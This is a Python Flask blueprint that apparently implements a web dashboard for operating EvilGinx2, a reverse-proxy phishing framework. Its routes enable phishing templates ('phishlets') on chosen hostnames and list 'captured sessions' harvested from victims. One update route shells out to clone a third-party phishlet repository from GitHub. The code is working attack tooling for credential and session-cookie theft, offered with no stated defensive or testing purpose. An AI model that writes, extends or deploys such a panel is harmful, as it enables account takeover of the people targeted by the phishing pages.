from flask import Blueprint, render_template, request, jsonify, flash, redirect, url_for
from flask_login import login_required, current_user
from app.evilginx_controller import get_evilginx_controller
import subprocess
import os

evilginx_bp = Blueprint('evilginx', __name__)

@evilginx_bp.route('/dashboard')
@login_required
def dashboard():
    """EvilGinx2 main dashboard"""
    controller = get_evilginx_controller()
    phishlets = controller.get_available_phishlets()
    sessions = controller.get_sessions()
    
    return render_template('evilginx/dashboard.html', 
                         phishlets=phishlets, 
                         sessions=sessions)

@evilginx_bp.route('/phishlets')
@login_required
def phishlets():
    """List all phishlets"""
    controller = get_evilginx_controller()
    phishlets = controller.get_available_phishlets()
    
    return render_template('evilginx/phishlets.html', phishlets=phishlets)

@evilginx_bp.route('/phishlet/<name>')
@login_required
def phishlet_detail(name):
    """View phishlet details"""
    controller = get_evilginx_controller()
    config = controller.parse_phishlet_config(name)
    
    if not config:
        flash(f'Phishlet {name} not found', 'danger')
        return redirect(url_for('evilginx.phishlets'))
    
    return render_template('evilginx/phishlet_detail.html', 
                         name=name, 
                         config=config)

@evilginx_bp.route('/api/phishlet/enable', methods=['POST'])
@login_required
def api_enable_phishlet():
    """Enable a phishlet"""
    data = request.get_json()
    phishlet_name = data.get('name')
    hostname = data.get('hostname')
    
    controller = get_evilginx_controller()
    
    if controller.enable_phishlet(phishlet_name, hostname):
        return jsonify({'success': True, 'message': f'Enabled {phishlet_name}'})
    else:
        return jsonify({'success': False, 'error': 'Failed to enable phishlet'}), 500

@evilginx_bp.route('/api/phishlet/disable', methods=['POST'])
@login_required
def api_disable_phishlet():
    """Disable a phishlet"""
    data = request.get_json()
    phishlet_name = data.get('name')
    
    controller = get_evilginx_controller()
    
    if controller.disable_phishlet(phishlet_name):
        return jsonify({'success': True, 'message': f'Disabled {phishlet_name}'})
    else:
        return jsonify({'success': False, 'error': 'Failed to disable phishlet'}), 500

@evilginx_bp.route('/api/phishlets/update', methods=['POST'])
@login_required
def api_update_phishlets():
    """Update phishlets from GitHub"""
    try:
        phishlets_dir = os.path.expanduser("~/evilginx2/phishlets")
        
        # Run the update commands
        commands = [
            f"cd {phishlets_dir} && git clone https://github.com/An0nUD4Y/Evilginx2-Phishlets.git temp_phishlets 2>/dev/null || true",
            f"cd {phishlets_dir} && mv temp_phishlets/*.yaml . 2>/dev/null || true",
            f"cd {phishlets_dir} && rm -rf temp_phishlets"
        ]
        
        for cmd in commands:
            subprocess.run(cmd, shell=True, check=False)
        
        # Count phishlets
        count = len([f for f in os.listdir(phishlets_dir) if f.endswith('.yaml')])
        
        return jsonify({
            'success': True,
            'message': 'Phishlets updated successfully',
            'count': count
        })
        
    except Exception as e:
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500

@evilginx_bp.route('/sessions')
@login_required
def sessions():
    """View captured sessions"""
    controller = get_evilginx_controller()
    sessions = controller.get_sessions()
    
    return render_template('evilginx/sessions.html', sessions=sessions)

@evilginx_bp.route('/session/<int:session_id>')
@login_required
def session_detail(session_id):
    """View session details"""
    controller = get_evilginx_controller()
    session = controller.get_session_details(session_id)
    
    if not session:
        flash('Session not found', 'danger')
        return redirect(url_for('evilginx.sessions'))
    
    return render_template('evilginx/session_detail.html', session=session)
